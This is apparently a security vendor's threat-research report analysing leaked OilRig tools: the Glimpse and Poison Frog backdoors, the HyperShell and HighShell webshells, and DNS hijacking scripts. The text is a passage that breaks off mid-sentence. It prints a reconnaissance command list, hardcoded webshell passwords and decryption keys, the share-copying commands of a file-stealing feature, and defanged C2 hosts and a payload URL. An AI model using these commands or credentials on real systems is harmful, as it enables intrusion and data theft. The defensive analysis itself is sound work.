OilRig operations may actually be from a global perspective. The organizations possibly under attack by OilRig is widely-spread across the spectrum of industry verticals, spanning from government, media, energy, transportation and logistics, and technology service providers. In total we identiﬁed nearly 13,000 stolen credentials, over 100 deployed webshells, and roughly a dozen backdoor sessions into compromised hosts across 27 countries, 97 organizations, and 18 industries. https://unit42.paloaltonetworks.com/behind-the-scenes-with-oilrig/ Pagina 1 di 24 Behind the Scenes with OilRig 08/08/24, 11:29 The information contained in this data dump include: Stolen credentials Potential systems to login to using stolen credentials Deployed webshell URLs Backdoor tools Command and control server component of backdoor tools Scripts to perform DNS hijacking Documents identifying speciﬁc individual operators Screenshots of OilRig operational systems The Leak In mid-March 2019, an unknown entity appeared on several hacking forums and Twitter with the user handle @Mr_L4nnist3r claiming they had access to data dumps involving internal tools and data used by the OilRig group. The initial claim included several screenshots of systems potentially in use by OilRig operators for attacks, a script that appeared to be used for DNS hijacking, and a password protected archive with the ﬁlename Glimpse.rar purporting to contain the command and control server panel for an OilRig backdoor. Soon after, a Twitter account with the user handle @dookhtegan appeared claiming they also had access to data dumps involving internal tools and data used by the OilRig group, as seen in Figure 1. This account used an image from 2004 of a high- proﬁle Iranian asylum seeker named Mehdy Kavousi who famously sewed his eyes and mouth shut to signify that rejecting his asylum claim and sending him back to Iran would be akin to putting him to death. It is unknown why this speciﬁc image was chosen, other than perhaps as a symbol of protest. Since the initial account creation, a stylized version of the original has been substituted as the proﬁle image, making it far more diﬃcult to understand who the original individual was. https://unit42.paloaltonetworks.com/behind-the-scenes-with-oilrig/ Pagina 2 di 24 Behind the Scenes with OilRig 08/08/24, 11:29 https://unit42.paloaltonetworks.com/behind-the-scenes-with-oilrig/ Pagina 3 di 24 Behind the Scenes with OilRig 08/08/24, 11:29 Figure 1. Tweets by @dookhtegan providing ﬁles associated with the OilRig leak This account continued a series of tweets voicing protest against the OilRig group and attributing its operations with a speciﬁc nation state and organization. Unit 42 is unable to validate this level of attribution, but a 2018 report from the United States National Counterintelligence and Security Center stated the OilRig group originates from an Iranian nexus. The account continued to post tweets with direct links to operational data dumps hosted on an anonymous ﬁle sharing service. The ﬁles posted included the previously password protected archive Glimpse.rar, as well as new archives containing hundreds of harvested credentials from compromised organizations along with details on exposed login prompts. There were also links to webshells previously and possibly currently deployed, the webshell source codes, as well as another backdoor and its server component. This account was suspended in short order, but immediately after the suspension, an alternate account with the username @dookhtegan1 with the same stylized proﬁle image appeared and is still currently active. This account mirrors the previous messages of exposing the OilRig group but no longer contains links to data dumps, instead instructing those that are interested in the data to join them in a private Telegram channel. Figure 2 shows this second Twitter account providing a Telegram channel to leak the data. Figure 2. Tweets by second account @dookhtegan1 providing a Telegram channel with the leaked ﬁles Data Dump Contents The contents of the data dump includes various types of datasets that appear to be results from reconnaissance activity, initial compromises, and tools the OilRig operators use against target organizations. The aﬀected organizations spread across the spectrum of industry verticals, spanning from government, media, energy, transportation and logistics, and technology service providers. The datasets included: https://unit42.paloaltonetworks.com/behind-the-scenes-with-oilrig/ Pagina 4 di 24 Behind the Scenes with OilRig 08/08/24, 11:29 Stolen credentials Potential systems to login to using stolen credentials Deployed webshell URLs Backdoor tools Command and control server component of backdoor tools Script to perform DNS hijacking Documents identifying speciﬁc individual operators Screenshots of OilRig operational systems We analyzed each type of dataset other than the documents containing detailed information on alleged OilRig operators and they remain consistent with previously observed OilRig tactics, techniques, and procedures (TTPs). While we are unable to conﬁrm the validity of the documents detailing individual operators simply due to a lack of visibility into that realm, we also have no reason to doubt their validity either. An interesting artifact we found in the data dump are the OilRig threat actors’ own internal names of various tools we have been tracking. Table 1 provides the internal operational names and the names we use to track these tools. Tool Type Backdoor Backdoor Webshell Webshell Webshell Internal Name Industry Name Poison Frog BONDUPDATER Glimpse Updated BONDUPDATER HyperShell TwoFace loader HighShell Minion TwoFace payload TwoFace payload variant DNS Hijacking Toolkit webmask Related to DNSpionage Table 1. Tools exposed in the OilRig data leak with their internal names mapped to the names used by the security community Credential Dumps In our analysis, we found that a total of ﬁfteen organizations had their credentials stolen in some fashion and stored in text ﬁles for the OilRig group to then abuse for additional attacks. In total, nearly 13,000 sets of credentials are included in the data dump. The credentials appear to have been stolen via multiple techniques, including using post-exploition password recovery tools such as MimiKatz or its variant ZhuMimiKatz. In addition to these tools, we believe OilRig attackers obtained credentials through, bruteforcing, SQL injections, and using traditional credential harvesting toolkits as we discussed in the Striking Oil blog published in September 2017. It appears to us that one organization had its entire Active Directory dumped out, making up most of the credentials we found in the data dump. The types of organizations listed in this data dump spread across multiple industry verticals but were all largely located in the Middle East region. We are unable to conﬁrm if all of these stolen credentials are indeed valid sets of credentials, but based upon previously observed activity, timestamping, and known behaviors, it is highly probable that these credentials were or may still be valid. Assuming the lists of credentials are valid, the mass collection conﬁrms our hypothesis that the OilRig group maintains a heavy emphasis on credential based attacks along with the other types of attacks they deploy. This is consistent with most espionage-motivated adversaries, as once the adversary gains access via legitimate credentials, they are able to masquerade as a legitimate user and essentially become an insider threat. This type of activity becomes signiﬁcantly harder to detect compared to using custom tools as the adversary masquerades as a legitimate user while most protections are intended to catch malware. In our past research, based oﬀ artifacts we had gathered, we had internally postulated the OilRig group likely had a propensity to immediately attempt to escalate privileges once they have their initial compromise, then try to move laterally into the local Microsoft Exchange server where they would then able to harvest more credentials and implant additional tools such as webshells and IIS backdoors. In a presentation provided by a FireEye researcher, they documented this exact attack lifecycle for incidents associated with OilRig in addition to be deploying a post-exploitation toolkit called Ruler within their attack playbook as well. Ruler is an open-source penetration testing toolkit which is predicated on being able to access Outlook Web Access (OWA) or OWA via stolen credentials, then abusing built-in functions to perform a variety of actions including retrieving the Global Address List, setting malicious email rules, and in OilRig’s case, performing remote code execution. The speciﬁc function of Ruler the OilRig group was using is the Ruler.Homepage function. This function abuses a capability in Microsoft Outlook which allows an administrator or a user to set a default homepage for any folder inside their inbox. Using stolen credentials, the operator would use Ruler to send commands to the target organization’s OWA instance via an RPC protocol which would then remotely set an arbitrary homepage for the compromised inbox’s folders. The operator would then include commands in the homepage to automatically retrieve and execute malicious code. In OilRig’s case, they included commands to retrieve and execute a backdoor, immediately giving them access to the endpoint in use by the user whose credentials had been stolen. https://unit42.paloaltonetworks.com/behind-the-scenes-with-oilrig/ Pagina 5 di 24 Behind the Scenes with OilRig Backdoors 08/08/24, 11:29 The data dump included two backdoors that we had previously associated with the OilRig threat group, both of which we had previously referred to as BONDUPDATER. Generally speaking, we are able to retrieve the implant or payload involved in an attack but are generally blind to the server side component. This data dump provided the backdoors and their associated server components which provides us a diﬀerent perspective on how the backdoors function. In addition, we discovered that the backdoors are actually called Glimpse and Poison Frog internally by OilRig and are functionally two diﬀerent tools. Glimpse The Glimpse tool within the data dump is related to the updated BONDUPDATER tool that we discovered being delivered to a Middle East government organization in a report we published on September 2018. We recently mentioned this tool in another report on April 16, as this variant of the BONDUPDATER tool used DNS tunneling to communicate with its C2, speciﬁcally using TXT queries to receive information from the C2 server. The data dump included the following three requisite components of the Glimpse tool seen in Table 2, as well as a Read me.txt ﬁle that explains how to set up and use Glimpse. Component Description Agent Server Panel Powershell scripts meant to run on compromised systems. Command and control server that communicates via DNS tunneling Graphical User Interface that allows actors to issue commands, upload and download ﬁles to Agents via the Server Table 2. The three components of the Glimpse tool Glimpse is a PowerShell script that contains the comment version 2.2, which suggests the OilRig group considers this a speciﬁc version of the tool and that it likely has included prior versions. The Glimpse panel, versioned “v1.0.5” is the tool that the actor uses to organize the various agents installed on compromised systems. The panel allows the actors to issue commands in addition to uploading ﬁles to and downloading ﬁles from the compromised endpoints. According to the compilation time, the developer of the Glimpse panel created this tool on September 1, 2018. Figure 3 shows the main Glimpse panel with three diﬀerent agents listed in a test environment. Figure 3. The Glimpse panel showing three compromised systems To interact with a speciﬁc agent, the actor selects the entry to open in the agent control panel. The agent control panel has three tabs that have interfaces that allow the actor to issue commands, as well as upload and download ﬁles to and from the agent. The command tab will show previously issued commands, when they were issued, and their status, as seen in Figure 4. https://unit42.paloaltonetworks.com/behind-the-scenes-with-oilrig/ Pagina 6 di 24 Behind the Scenes with OilRig 08/08/24, 11:29 Figure 4. Glimpse’s Agent Control Panel showing the interface actors would use to send commands The actor clicks the command to view the results in a popup window named “Result Viewer”. Figure 5 shows the result viewer window showing the results of the issued command. Figure 5. The Result Viewer showing the results of an issued command The server portion of Glimpse works in unison with the panel by acting as a DNS server, which is written in JavaScript and runs in the Node.js runtime. The server has a ﬁlename of srvr.js, which according to the Read me.txt ﬁle is meant to be run using forever start srvr.js in Node.js. Figure 6 shows the Glimpse server responding to an inbound beacon from the Glimpse agent and sending a command whoami. The screenshot also shows the Glimpse server receiving the results of the whoami command executed by the agent. https://unit42.paloaltonetworks.com/behind-the-scenes-with-oilrig/ Pagina 7 di 24 Behind the Scenes with OilRig 08/08/24, 11:29 Figure 6. The Glimpse server issuing a command to an agent and receiving the results of the command Poison Frog The second backdoor included in the data dump is named Poison Frog. The dataset includes both the agent that the actor would install on targeted systems and the server that would allow the actor to interact with compromised systems. The Poison Frog tool appears to be a variant of BONDUPDATER used in targeted attacks in the Middle East, as reported by FireEye in December 2017. Table 3 shows the ﬁles associated with the agent included in the data dump, of which the dUpdater.ps1 portion of Poison Frog appears to be the initial variant of BONDUPDATER that uses DNS tunneling for its C2 channel as discussed in our recent blog discussing OilRig’s DNS tunneling protocols. Interestingly, both of these Poison Frog agent scripts were conﬁgured to use the domain myleftheart[.]com as its C2 server though we have not seen this domain in any attacks, and we were unable to associate it with any known OilRig infrastructure. Filename SHA256 Description poisonfrog.ps1 hUpdater.ps1 dUpdater.ps1 27e03b98ae0f6f2650f378e9292384f1350f95ee4f3ac009e0113a8d9e2e14 Dropper that installs hUpdater.ps1 and ed dUpdater.ps1 995ea68dcf27c4a2d482b3afadbd8da546d635d72f6b458557175e0cb98d d999 Poison Frog agent that uses HTTP for C2 0f20995d431abce885b8bd7dec1013cc1ef7c73886029c67df53101ea33043 6c Poison Frog agent that uses DNS tunneling for C2 https://unit42.paloaltonetworks.com/behind-the-scenes-with-oilrig/ Pagina 8 di 24 Behind the Scenes with OilRig 08/08/24, 11:29 Table 3. Files associated with the Poison Frog agent provided in the leak Like the Glimpse C2 server, the Poison Frog server was written in JavaScript and will run in Node.js. The Poison Frog server handles both the HTTP and DNS tunneling channels used by the hUpdater.ps1 and dUpdater.ps1 scripts. According to the server’s code, the default command that it would issue to newly infected systems was a batch script contained in a ﬁle named 0000000000.bat. The data dump included the 0000000000.bat ﬁle, which when executed on an infected system would run the following commands to gather information to be sent back to the C2 server: whoami hostname ipconfig /all net user /domain net group /domain net group ""domain admins"" /domain net group ""Exchange Trusted Subsystem"" /domain net accounts /domain net user net localgroup administrators netstat -an tasklist systeminfo reg query ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"" schtasks /query /FO List /TN ""GoogleUpdatesTaskMachineUI"" /V | findstr /b /n /c:""Repeat: Every:"" WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List This batch script is also interesting as it uses echo commands to include headers before each of the command results. The headers included in this batch script looked very familiar, as we had seen a very similar batch script provided via the HTTP C2 channel for the Helminth backdoor delivered by a Clayslide delivery document as we reported in October 2016 (SHA256: 903b6d948c16dc92b69fe1de76cf64ab8377893770bf47c29bf91f3fd987f996). The following HTTP request from the Helminth backdoor (SHA256: 1fb69090be8a2e11eeb220b26ee5eddf1e3fe81ffa59c47d47d01bf90c2b080c) downloaded the similar batch script: GET /update-index.aspx?req=1786873725%5Cbat&m=d HTTP/1.1 Host: update-kernal[.]net Connection: Keep-Alive We performed a code comparison to visualize the similarities between the batch script delivered as the default command in Poison Frog is to the script provided to the Helminth backdoor. Figure 7 shows just how similar these two batch scripts are with several of the headers being exactly the same and a majority of the commands being the same with the Helminth commands having the 2>&1 suﬃx to include command errors with the output. Figure 7. Code comparison between the default batch script issued by Poison Frog’s C2 and a batch script received by the Helminth Trojan https://unit42.paloaltonetworks.com/behind-the-scenes-with-oilrig/ Pagina 9 di 24 Behind the Scenes with OilRig Webshells 08/08/24, 11:29 The data dump included several diﬀerent webshells apparently used by OilRig to interact with compromised servers. The three webshells included in the dump had names HyperShell, HighShell, and Minion, but it appears that Minion is likely a variant of HighShell based on code, ﬁlename, and functionality overlaps. The HyperShell and HighShell webshells are variants of what we track as TwoFace, with HyperShell being related to the TwoFace loader and HighShell being related to the TwoFace payload, as we reported in July 2017. In addition to the actual webshells in use by OilRig, the data dump includes lists of existing deployments of webshells hosted on compromised websites. Over 100 links to webshells are listed, spanning across 87 organizations in 26 countries across four continents as seen in Figure 8. https://unit42.paloaltonetworks.com/behind-the-scenes-with-oilrig/ Pagina 10 di 24 Behind the Scenes with OilRig 08/08/24, 11:29 Figure 8. Geographic location of webshells of impacted organizations Hypershell The HyperShell webshell included in the data dump (SHA256: e483eee77fcc5ef11d5bf33a4179312753b62ec9a247dd14528cc797e7632d99) is an example of the 3DES variant of the TwoFace loader that we called TwoFace++ in as we reported in July 2017. During our initial research into the TwoFace++ loader, we were unable to extract the embedded payload using the same brute forcing technique that we used on the initial TwoFace loader samples. The initial TwoFace loader samples decrypted an embedded webshell using an actor provided key, which was modiﬁed by using simple arithmetic operators (""+"" or ""-"" speciﬁcally) and a salt string embedded within the loader webshell, whose result decrypts an embedded payload using simple arithmetic operators (again, ""+"" or ""-"" speciﬁcally). We were able to brute force the actor-provided key using the inverse arithmetic operations using the embedded salt and embedded ciphertext, so we were able to extract the embedded webshells with ease. Unlike the initial TwoFace loader, the TwoFace++ loader used the 3DES cipher and a SHA256 hash of a string provided by the actor and used as a key, so we were unable to extract the embedded webshells as we were unable to determine the actor provided key. However, the HyperShell sample in this dump provided the necessary information to determine the actor-provided key needed to decrypt its embedded webshell. Like many initial TwoFace loader samples, the HyperShell sample includes a string within the HTML tags <pre> and </pre> that is displayed in the browser if a password is not supplied and/or the TwoFace++ loader is unable to extract the embedded payload webshell. The pre tags within the HyperShell sample are: <pre><%= Server.HtmlEncode(""NxKK<TjWN^lv-$*UZ|Z-H;cGL(O>7a"") %></pre> Figure 9 shows HyperShell displaying the content within the ""pre"" tags within the browser. We determined the string in the pre tags is the actor provided password, which the webshell uses as a key to decrypt the embedded payload. We determined this by following the process in which the TwoFace++ loader webshell uses the actor provided password to authenticate and decrypt the embedded webshell: Figure 9. HyperShell displaying the password within <pre> tags Append a string to the password that acts as a salt Obtain the SHA1 hash of the resulting string containing the password and salt Base64 encode the SHA1 hash Compare the encoded hash with hardcoded base64 string If the encoded hash matches hardcoded base64 string then the inbound request is authenticated Generates the SHA256 hash of the password string Base64 encodes the SHA256 hash and uses the ﬁrst 24 characters as a key Uses 24-character key and the 3DES cipher to decrypt the embedded webshell Now let's look at how this works with the values in the TwoFace++ loader sample. The actor provided password of NxKK<TjWN^lv-$*UZ|Z-H;cGL(O>7a has the hardcoded salt string aqB2nU65TgFoEfdVqiAddBQLInc9 appended to it. The resulting string of NxKK<TjWN^lv-$*UZ|Z- H;cGL(O>7aaqB2nU65TgFoEfdVqiAddBQLInc9 has a SHA1 hash of 9d3ff106fbc3508b8453c7d6f285543d0b9c2721, which is base64 encoded to nT/xBvvDUIuEU8fW8oVUPQucJyE=. The hardcoded base64 encoded password within the sample is nT/xBvvDUIuEU8fW8oVUPQucJyE=, which conﬁrms that the string provided in the pre tags is the password. Once authenticated, the TwoFace++ loader uses the password to decrypt the embedded webshell. To use the password as a key for 3DES, TwoFace++ will generate the SHA256 password of the NxKK<TjWN^lv-$*UZ|Z-H;cGL(O>7a string that results in a hash of 11f66b55f3d24303621e5ef9565b02a576cc58bc5f8789cae96c3d400064b90e. The SHA256 hash is then base64 encoded, which results in an encoded string of EfZrVfPSQwNiHl75VlsCpXbMWLxfh4nK6Ww9QABkuQ4=, of which the ﬁrst 24 characters are used as the 3DES key. The key EfZrVfPSQwNiHl75VlsCpXbM is used as the key for 3DES, which results in a webshell (SHA256: d2b835b102117e327fdc4905ead24d45f46e82dd5ae525e90cca0a685d307619) that matches the TwoFace payload webshell we published in our https://unit42.paloaltonetworks.com/behind-the-scenes-with-oilrig/ Pagina 11 di 24 Behind the Scenes with OilRig 08/08/24, 11:29 original blog. This resulting webshell also appears to be a variant of HighShell, speciﬁcally version v5.0. We compared the v5.0 version of HighShell to the TwoFace payload (SHA256: 54c8bfa0be1d1419bf0770d49e937b284b52df212df19551576f73653a7d061f), as they are visually extremely similar. Figure 10 shows the two webshells sharing the same user interface, with two notable exceptions in the HighShell webshell, speciﬁcally a version number “v5.0” and three little boxes at the bottom left used to display error messages and the results of commands. Figure 10. Animation showing the diﬀerences between the HighShell v5.0 and TwoFace payload To supplement the visual similarities, we performed an analysis of the code of the two webshells to identify overlaps. The two webshells share a signiﬁcant amount of code with a majority of the diﬀerences being slightly diﬀerent variable and function names. The most notable diﬀerence is that the HighShell v5.0 webshell includes a salt value it applies to the actor provided password that it uses for authentication. Figure 11 shows the code comparison between the TwoFace payload on the left (SHA256: 54c8bfa0be1d1419bf0770d49e937b284b52df212df19551576f73653a7d061f) and HighShell v5.0 on the right (SHA256: d2b835b102117e327fdc4905ead24d45f46e82dd5ae525e90cca0a685d307619). The code comparison speciﬁcally shows the HighShell code including a salt variable containing di2zag7wZHTK9YR0NGq, which is not present within the TwoFace code on the left. The code comparison in Figure 11 also highlights how much code is shared between the two samples. We believe the TwoFace payload is a predecessor to the HighShell v5.0 webshell, the latter of which was created during the ongoing development eﬀorts carried out by OilRig throughout their operations. Figure 11. Comparison between HighShell v5.0 and TwoFace payload https://unit42.paloaltonetworks.com/behind-the-scenes-with-oilrig/ Pagina 12 di 24 Behind the Scenes with OilRig HighShell 08/08/24, 11:29 The data dump also included a webshell named HighShell, which we discovered was dropped by HyperShell as discussed in the previous section. The dump included many diﬀerent HighShell samples, of which we have identiﬁed at least three diﬀerent versions, seen in Table 4. The increasing version numbers suggest that OilRig continually developed HighShell to be used in their operations. SHA256 Filename fe9cdef3c88f83b74512ec6400b7231d7295bda780 error4.asp 79b116627c4bc9b7a373e0 22c4023c8daa57434ef79b838e601d9d72833fec3 63340536396fe7d08ee2017 691801e3583991a92a2ad7dfa8a85396a97acdf8a0 054f3edﬀd94fc1ad58948 x HighShell. aspx HighShellL ocal.aspx Ver sion v5.0 v7.1 8.6. 2 Table 4. Three HighShell webshells within data leak that speciﬁed their version The version numbers themselves do not appear to be consistently updated, however. For instance, the HighShell webshell (SHA256: d2b835b102117e327fdc4905ead24d45f46e82dd5ae525e90cca0a685d307619) extracted from HyperShell in the prior section showed a version number of “v5.0”, which is obviously diﬀerent than the “v5.0” HighShell with a ﬁlename of error4.aspx seen in Figure 12. Figure 12. HighShell v5.0 with a new color scheme and explorer tab Figure 12 shows a second HighShell v5.0 sample with a diﬀerent color scheme used for its user interface; however, a majority of the functionality is the same as the other v5.0 sample extracted from HyperShell. One interesting addition to this variant of HighShell v5.0 is the introduction of a tabular interface that includes a main tab and an explorer tab. The main tab contains the same functionality as the TwoFace payload and the other v5.0 HighShell sample. The explorer tab, as seen in Figure 13 allows the actors to navigate the compromised server’s ﬁle system. https://unit42.paloaltonetworks.com/behind-the-scenes-with-oilrig/ Pagina 13 di 24 Behind the Scenes with OilRig 08/08/24, 11:29 Figure 13. HighShell v5.0 explorer tab allows actor to navigate the ﬁle system The HighShell v7.1 variant from the data dump contains similar functionality to its predecessors and continued the tabular approach but expanded even further by splitting out the main functionality across multiple tabs, speciﬁcally “Command”, “Explorer”, “Upload”, “Download”, “Sql Server” and “Change Time”. Figure 14 shows HighShell v7.1 and its multiple tabs. Figure 14. HighShell v7.1 spreads out the webshell by using separate tabs for the various functionality The data dump also included an archive named ShellLocal-v8.8.5.rar that contains another HighShell variant. The archive name would suggest the HighShell variant was version v8.8.5, but the user interface suggested it was version 8.6.2, as seen in Figure 15. This variant of HighShell shares code from its predecessors, but it appears that OilRig re-architected this webshell to include a front end user interface that interacts with a back end script via AJAX web requests. In addition to the change in architecture, this version of HighShell has an enhanced interface as well. https://unit42.paloaltonetworks.com/behind-the-scenes-with-oilrig/ Pagina 14 di 24 Behind the Scenes with OilRig 08/08/24, 11:29 The 8.6.2 version of HighShell shares signiﬁcant functionality with its predecessors, but also contains several new and interesting functionalities as well. The interesting features of this version of HighShell includes several executable modules, a network downloader functionality, and a spy check feature. Figure 15. HighShell v8.6.2 with updated interface Modules HighShell 8.6.2 includes the ability to use several modules included with the webshell. The modules are PE executables that come prepackaged with the webshell that further extend its capabilities. Table 5 shows the modules provided with this variant of HighShell. The webshell will use the 7za module to archive ﬁles from the Explorer tab, while the nbtscan module allows the webshell to scan the network for systems to build an IP list of system it can interact with. We were unable to determine how the webshell would use the remote execute module, as the webshell does not actually seem to use it. Filename SHA256 Description dd6d7af00ef4ca89a319a230cdd094275c3a1d365807fe5b34133324bdaa0229 7-Zip 17.01 beta c9d5dc956841e000bfd8762e2f0b48b66c79b79500e894b4efa7fb9ba17e4e9e nbtscan 1.0.35 a6a0fbfee08367046d3d26fb4b4cf7779f7fb6eaf7e60e1d9b6bf31c5be5b63e IntelliAdmin Remote Execute v1.0 Table 5. Modules included with HighShell v8.6.2 7za.exe nbt.exe rx.exe Spy Check The Spy Check functionality appears at the top right corner of the webshell as a box with a countdown timer. The timer starts at 300 and decrements every second, suggesting that the webshell executes the Spy Check functionality every ﬁve minutes. The Spy Check functionality is rather interesting, as we do not know its exact purpose other than either displaying a red box with a spy icon or a green box with a heart icon. We believe this functionality was meant to notify the actor in the event that they were using an altered HighShell front end webshell, possibly to avoid using the webshell if it had been detected and modiﬁed by a third-party. We are speculating this is the intended function because the Spy Check function begins by reading the .aspx ﬁle of the HighShell front end (HighShellLocal.aspx in this case). The Spy Check then generates the SHA256 hash of the HighShell front end and compares it with a hardcoded SHA256 of f35e566e28be5b3257670be6e125eb90814b9cb27df997090cea0b7a22fbd75c to determine if the webshell had been modiﬁed. If the hashes do not match, the webshell will display a red box with spy icon, as seen in Figure 15, or a green box with a heart icon if it matches. All known samples display the red box with a spy icon, suggesting that the developer of HighShell did not update this functionality during development eﬀorts or that the samples have been modiﬁed in some way. Network Downloader The Network Downloader functionality allows the actor to quickly upload user ﬁles from remote victim systems. To use this functionality, the actor must provide information within the ""Target Computer"" portion of the webshell, speciﬁcally a network administrator username and password, as well as a list of IP addresses of remote systems added in the ""Select Computer"" drop down. Before performing the network download, the webshell checks the storage volume on the server https://unit42.paloaltonetworks.com/behind-the-scenes-with-oilrig/ Pagina 15 di 24 Behind the Scenes with OilRig 08/08/24, 11:29 that the webshell is running on to determine if it has more than 30 GB of free space. If the server has less than 30 GB of free space the webshell will not perform the activity, which indicates that the developer of the webshell expects a high volume of data downloaded from the victim network. The webshell will iterate through the IP list and perform a series of commands for each IP, starting oﬀ with using the following command to connect to the remote system: net use [IP address] /user:[domain admin username] [domain admin password] 2>&1 After connecting to the remote system with net use, the webshell will run the following command to obtain a list of user folders: dir /b [IP address]\c$\Users 2>&1 With a list of user folders, the webshell will iterate through the list of users and enumerate all of the ﬁles in the following folders: [IP address]\c$\Users\[username]\Desktop [IP address]\c$\Users\[username]\Documents [IP address]\c$\Users\[username]\Downloads The Network Downloader function will gather all the ﬁles in these folders and use 7-Zip to compress and archive the ﬁles. The webshell will save the archives locally to the server in the C:\Users\Public\Libraries\Recorded\Files folder, each with a ﬁlename with the following structure: [IP address]_c$_Users_[username]__[Desktop-Documents-Downloads]_[year]-[month]-[day]-[hours]-[minutes]- [seconds].7z It is likely that the threat actors use this functionality to rapidly check for new ﬁles created by users on the network. Minion Minion appears to be another webshell related to HighShell, as it contains similar functionality and signiﬁcant code overlap. Based on the login functionality within Minion, we believe the same entities were involved in the development of Minion and HyperShell. To use Minion, the actor must provide the username of admin and a password to authenticate before using the webshell. To authenticate, the password has the string O%tG7Hz57kvWk35$D*)s$1l$pUpLnBw)apHR!xYZWZu7X#^w7$mCArmQMAa&sRBG appended to it as a salt value. The webshell generates the SHA256 hash of the resulting string and base64 encodes it to compare with the hardcoded string of m6m8CCWa/u820mie8bX3HKIx1+WQkB+lbmniyXWKB+8=. The password and salt string must result in a SHA256 hash of 9ba9bc08259afeef36d2689ef1b5f71ca231d7e590901fa56e69e2c9758a07ef to properly authenticate. This is the exact same process used to authenticate/decrypt within HyperShell. Much like HighShell version 8.6.2, Minion includes modules to extend the webshell’s functionality. Table 6 shows the modules included with Minion, three of which are the same exact ﬁles as seen in the HighShell and Minion including Hobocopy and a port scanning, screenshot tool called Tardigrade. Filename SHA256 dd6d7af00ef4ca89a319a230cdd094275c3a1d365807fe 5b34133324bdaa0229 Description 7-Zip 17.01 beta 3ca3a957c526eaeabcf17b0b2cd345c0ﬀfab549adfdf04 470b6983b87f7ec62 Hobocopy c9d5dc956841e000bfd8762e2f0b48b66c79b79500e8 94b4efa7fb9ba17e4e9e nbtscan 1.0.35 a6a0fbfee08367046d3d26fb4b4cf7779f7fb6eaf7e60e1 d9b6bf31c5be5b63e IntelliAdmin Remote Execute v1.0 7za.exe hb.exe nbt.exe rx.exe tardigrade. exe fe1b011fe089969d960d2dce2a61020725a02e15dbc812 ee6b6ecc6a98875392 Tardigrade application. Can perform port scanning, screenshots and connect to remote systems with “net use”. Table 6. Modules included with the Minion webshell DNS Hijacking Script In November 2018, Cisco Talos published research on an attack campaign named DNSpionage. It involved attacks using malware to compromise individual endpoints, but most interestingly described an eﬀort to speciﬁcally hijack DNS entries of government organizations to redirect visitors to likely malicious, adversary operated systems. Both FireEye and Crowdstrike followed up with their own assessments for the DNS hijacking eﬀorts, and described operations extending back to January 2017. No attribution to any known adversary groups was provided, other than that the target radius was primarily in the Middle East and the adversary was also likely operating out of that region. In this data dump, a tool called webmask is included which appears to be a series of scripts speciﬁcally meant to perform DNS hijacking. An informational document is included titled guide.txt, as seen in Figure 16 that provides instructions to the operator on how to execute the DNS hijacking attack using the provided tools. Based upon the instructional guide and the provided tools, this package appears consistent with the methodologies FireEye outlined in their https://unit42.paloaltonetworks.com/behind-the-scenes-with-oilrig/ Pagina 16 di 24 Behind the Scenes with OilRig 08/08/24, 11:29 research on how these attacks were executed, including speciﬁc details such as the use of ICAP via a proxy passthrough, in this case speciﬁcally squid, and using certbot to create a Let’s Encrypt SSL certiﬁcate. Figure 16. Instructions within guide.txt explaining how to carry out DNS hijacking attack In one part of guide.txt, an example target appears to be provided, with a corresponding adversary IP (185.162.235[.]106) for the legitimate domain to be redirected to. Analysis of this IP provides several interesting data points, including possible relationships to previously observed OilRig infrastructure. Examining the hosting provider shows that the IP is associated with an Iranian hosting provider called NovinVPS. The autonomous system name of the IP shows that the allocation is controlled by Serverius Holding B.V., which is an autonomous system name we have previously seen associated with the OilRig group. In fact, examining the Class C IP block of 185.162.235[.]0/24 shows at least two other IPs we have previously identiﬁed as in use by the OilRig group for C2 servers. 185.162.235[.]29 and 185.162.235[.]121 and their associated domains, office365-management[.]com and msoffice-cdn[.]com respectively. Oﬃce365-management[.]com was ﬁrst identiﬁed in October 2017 as a C2 servers for OilRig operations delivering the ISMInjector backdoor. Later in February 2018 we were able to link the entire grouping of infrastructure to another campaign delivering the OopsIE backdoor via the reuse of WHOIS registrant artifacts, shared SSL certiﬁcates, and a shared Class C IP block. Figure 17 shows the relationship between the ﬁles related to DNS hijacking and known infrastructure associated with OilRig. https://unit42.paloaltonetworks.com/behind-the-scenes-with-oilrig/ Pagina 17 di 24 Behind the Scenes with OilRig 08/08/24, 11:29 Although we are unable to say with certainty that the DNSpionage operations were absolutely executed by the OilRig group, it is possible based on the provided data that there may be some level of relationship between them. Figure 17. Relationship between DNS Hijacking ﬁles and OilRig infrastructure Screenshots The data dump includes several screenshots of resources that the leaker alleged was related to the OilRig group. The screenshots included remote desktop (RDP) sessions showing the Glimpse panel, a web browser session displaying a C2 panel called Scarecrow, web browser sessions into VPS administrative panels, and evidence of potential destructive attacks against OilRig servers. The screenshot in Figure 18. appears to be a C2 panel for an unknown backdoor. The only name provided is Scarecrow, which is not a name we have previously observed or associated with OilRig. The server is hosted on 142.234.157[.]21 which appears to be hosted by LeaseWeb. If we are to assume the ﬁlename is consistent with a real time snapshot of the server panel, it would indicate that multiple systems were actively compromised as of March 29, 2019. https://unit42.paloaltonetworks.com/behind-the-scenes-with-oilrig/ Pagina 18 di 24 Behind the Scenes with OilRig 08/08/24, 11:29 Figure 19 shows an administrative panel to an Iranian based virtual hosting provider called Berbid Server. No other infrastructure details are displayed. Figure 18. Screenshot provided in leak showing Scarecrow panel Figure 19. Screenshot provided in leak showing administrative panel for hosting provider Berbid Server The screenshot showed the administrative panel for a VPS account on DeltaHost with four diﬀerent virtual servers, as seen in Figure 20. One of these virtual servers was hosted at an IP address of 193.111.152[.]13 and had been up for 194 days (in the red box in Figure 20) at the time this control panel was apparently accessed. https://unit42.paloaltonetworks.com/behind-the-scenes-with-oilrig/ Pagina 19 di 24 Behind the Scenes with OilRig 08/08/24, 11:29 Figure 20. Screenshot in leak of administrative panel for an account at DeltaHost If we use the ﬁlename of this screenshot and assume that it was taken on March 29, 2019 and subtract 194 days from this date, it is possible that this server had been operational since at least September 16, 2018. On September 24, 2018, we observed an organization targeted by OilRig attempting to download a Zip archive from the following URL: hxxp://193.111.152[.]13/[redacted]-ITsoftwareUpdate.zip This Zip archive contained a ﬁle named [redacted]-ITsoftwareUpdate.exe (SHA256: 5f42deb792d8d6f347c58ddbf634a673b3e870ed9977fdd88760e38088cd7336), which is a variant of the OopsIE Trojan we described in detail in a blog we published in September 2018. This suggests that the server displayed in the VPS control panel may have indeed been in use by the OilRig threat actors at the time of attack. In addition, two of the other IPs listed in this panel, 185.161.209[.]57 and 185.161.210[.]25 are in the same 185.161.208[.]0/22 range as an IP associated with the DNSpionage campaign, 185.161.211[.]72. This is 